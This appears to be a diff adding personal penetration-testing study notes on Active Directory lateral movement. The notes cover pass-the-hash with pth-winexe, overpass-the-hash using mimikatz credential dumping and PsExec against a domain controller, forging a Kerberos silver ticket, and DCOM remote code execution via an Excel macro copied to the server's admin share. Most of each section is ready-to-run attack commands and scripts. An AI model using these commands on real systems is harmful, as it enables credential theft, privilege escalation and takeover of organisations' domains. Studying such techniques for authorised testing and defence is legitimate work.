@@ -1,0 +1,110 @@
+
+
+### PtH
+
+we can use PtH with NTLM hash on SMB protocol to have a shell on kali by using pth-winexe:
+
+pth-winexe -U <user>%<the static part: aad3b435b51404eeaad3b435b51404ee>:<NTLM hash> //<ip> cmd
+
+
+=================================================================================================================
+
+### over PtH
+
+the operation requiers the admin to log on the machine and its like this:
+
+1- get the admin hash
+2- get admin's powershell using that hash
+3- request TGT for the admin account and TGS for CIFS service
+4- use that TGT to get cmd on active directory using PsExec.exe microsft program after downloading it
+
+
+1- 	
+	mimikatz# privilege::debug
+	mimikatz# sekurlsa::logonpasswords
+2-
+	mimikatz# sekurlsa::pth /user:administrator /domain:tshoot.com /ntlm:<the admin hash> /run:powershell.exe
+3-
+	net use \\DC
+	klist
+4-
+	.\PsExec.exe \\DC cmd.exe
+
+
+
+==================================================================================================================
+
+### PtT
+
+it happens to a service, we can craft a selver ticket to access the service resources on any server used the same pincipal name.
+
+first we need the domain SID we can easly extract it:
+
+	whoami /user     ------> SID= S-1-5-21-<three Random numbers>-RID, remove RID and get the domain SID
+
+then we craft the silver ticket using mimikatz:
+
+	mimikatz# kerberos::purge	-------> flush all the tickets (educatinal porposess only)
+
+	mimikatz# kerberos::golden /user:administrator /domain:tshoot.com /sid:S-1-5-21-5555655665-56565656-56565656 /target:DC.tshoot.com /service:HTTP /rc4:<NTLM hashed service password> /ptt
+
+then we use this ticket to access any service information.
+
+!note rc4 is the password hash of the service, if the kerberoasting operation get us the cleartext password we must hash it the use it creating the ticket.
+
+===================================================================================================================
+
+### DCOM Distributed Componetnt Object Model requir admin privileges
+
+used in microsft office, its goal to create a RCE on a Server like AD using macros in powerpoint,outlock,.....etc
+
+first microsoft office should be installed on the machine and the server, we can discover the available method:
+
+	$com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "<server IP>"))
+	$com | Get-Member
+
+we should see run method, then create a reverse shell through macros like we did in client_side_attack but this time with Excel file, macros called mymacros and the file called myexcel.xls, then we complete with the script:
+
+	$LocalPath = "the path to myexcel.xls" 
+
+	$RemotePath ="\\<server IP>\c$\myexcel.xls"
+
+	[System.IO.File]::Copy($LocalPath, $RemotePath, $True)
+
+	$Path = "\\<server IP>\c$\windows\sysWOW64\config\systemprofile\Desktop" 
+
+	$temp =[system.io.directory]::createDirectory($Path)
+
+	$Workbook = $com.Workbook.Open("C:\myexcel.xls")
+
+	$com.Run("mymacro")
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+	
